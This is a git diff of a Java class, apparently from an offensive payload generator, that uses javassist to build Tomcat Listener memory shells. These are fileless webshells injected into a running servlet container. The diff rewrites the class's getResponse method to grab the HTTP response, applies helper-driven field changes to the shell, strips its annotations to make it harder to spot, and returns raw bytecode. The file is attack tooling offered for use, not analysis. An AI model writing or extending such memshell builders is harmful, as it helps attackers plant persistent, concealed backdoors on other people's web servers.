@@ -1,13 +1,14 @@
 package com.ppp.middleware.builder;
 
+import com.ppp.MemShellHelper;
 import com.ppp.annotation.Builder;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
-import com.ppp.utils.maker.Encoder;
 import com.ppp.utils.maker.JavaClassUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import javassist.CtMethod;
 
 /**
  * @author Whoopsunix
@@ -16,34 +17,28 @@ import javassist.CtClass;
 @Middleware(Middleware.Tomcat)
 public class TomcatMSJavaClassBuilder {
     @MemShell(MemShell.Listener)
-    public String listener(Class cls) throws Exception {
+    public byte[] listener(Class cls, MemShellHelper memShellHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
         classPool.importPackage("javax.servlet.http");
 
         CtClass ctClass = classPool.getCtClass(cls.getName());
 
+        // response
+        CtMethod ctMethod = ctClass.getDeclaredMethod("getResponse");
+        ctMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
+                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
+                "return httpServletResponse;}");
 
-//        CtMethod ctMethod = ctClass.getDeclaredMethod("getResponse");
-//
-//        ctMethod.setBody("{\n" +
-//                "        HttpServletResponse httpServletResponse = null;\n" +
-//                "        try {\n" +
-//                "            Object request = getFieldValue($1, \"request\");\n" +
-//                "            httpServletResponse = (HttpServletResponse) getFieldValue(request, \"response\");\n" +
-//                "        } catch (Exception e) {\n" +
-//                "\n" +
-//                "        }\n" +
-//                "        return httpServletResponse;\n" +
-//                "    }");
-
+        // MemShell 信息修改
+        MemShellModifier.fieldChange(cls, ctClass, memShellHelper);
 
         // 清除所有注解
         JavaClassUtils.clearAllAnnotations(ctClass);
 
-
         byte[] classBytes = ctClass.toBytecode();
-        String b64 = Encoder.base64encoder(classBytes);
-        return b64;
+        return classBytes;
+//        String b64 = Encoder.base64encoder(classBytes);
+//        return b64;
     }
 }
